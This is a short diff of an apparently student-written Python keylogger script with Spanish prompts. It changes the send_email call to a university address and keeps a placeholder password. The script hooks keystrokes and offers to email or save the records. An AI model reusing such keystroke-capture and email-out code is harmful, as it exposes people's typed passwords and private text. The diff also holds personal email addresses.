@@ -24,7 +24,7 @@ def main():
         respuesta_guardar = input("¿Deseas guardar los registros en texto plano? (yes/no): ")
         
         if respuesta_email.lower() in ['yes', 'y']:
-            send_email("Paola_VB@ciencias.unam.mx", "janet", "pass")
+            send_email("Paola_VB@ciencias.unam.mx", "janet1204@ciencias.unam.mx", "pass")
         
         if respuesta_guardar.lower() in ['yes', 'y']:
             keyboard.on_release(callback)
